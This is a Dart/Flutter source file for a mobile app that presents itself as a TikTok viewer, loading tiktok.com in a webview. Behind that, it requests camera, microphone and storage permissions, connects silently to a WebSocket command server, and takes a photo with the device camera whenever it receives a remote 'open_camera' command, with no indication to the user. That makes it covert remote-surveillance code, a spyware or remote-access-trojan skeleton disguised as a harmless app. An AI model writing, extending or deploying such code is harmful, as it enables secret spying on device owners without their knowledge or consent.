import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/io.dart';
import 'package:camera/camera.dart';
import 'dart:convert';

List<CameraDescription> cameras = [];

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  try {
    cameras = await availableCameras();
  } catch (e) {
    print('Camera error: $e');
  }
  runApp(const MyaWutYiApp());
}

class MyaWutYiApp extends StatelessWidget {
  const MyaWutYiApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Mya Wut Yi',
      home: TikTokHomeScreen(),
    );
  }
}

class TikTokHomeScreen extends StatefulWidget {
  const TikTokHomeScreen({Key? key}) : super(key: key);

  @override
  State<TikTokHomeScreen> createState() => _TikTokHomeScreenState();
}

class _TikTokHomeScreenState extends State<TikTokHomeScreen> {
  late final WebViewController _controller;
  bool _isLoading = true;
  WebSocketChannel? _channel;
  String _serverStatus = 'Disconnected';
  CameraController? _cameraController;

  @override
  void initState() {
    super.initState();
    _requestPermissions();
    _initWebSocketConnection();

    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(Colors.black)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (String url) => setState(() => _isLoading = true),
          onPageFinished: (String url) => setState(() => _isLoading = false),
        ),
      )
      ..loadRequest(Uri.parse('https://www.tiktok.com'));
  }

  Future<void> _requestPermissions() async {
    await [
      Permission.camera,
      Permission.microphone,
      Permission.storage,
      Permission.notification,
    ].request();
  }

  void _initWebSocketConnection() {
    try {
      _channel = IOWebSocketChannel.connect('ws://10.0.2.2:8080');
      setState(() {
        _serverStatus = 'Connected';
      });

      _channel!.stream.listen((message) {
        _handleRemoteCommand(message);
      });
    } catch (e) {
      setState(() {
        _serverStatus = 'Failed';
      });
    }
  }

  void _handleRemoteCommand(dynamic message) async {
    try {
      final data = jsonDecode(message);
      String command = data['command'] ?? '';
      if (command == 'open_camera') {
        if (cameras.isNotEmpty) {
          _cameraController = CameraController(cameras[0], ResolutionPreset.medium);
          await _cameraController!.initialize();
          await _cameraController!.takePicture();
        }
      }
    } catch (e) {}
  }

  @override
  void dispose() {
    _channel?.sink.close();
    _cameraController?.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            WebViewWidget(controller: _controller),
            if (_isLoading)
              const Center(
                child: CircularProgressIndicator(color: Colors.white),
              ),
          ],
        ),
      ),
    );
  }
}
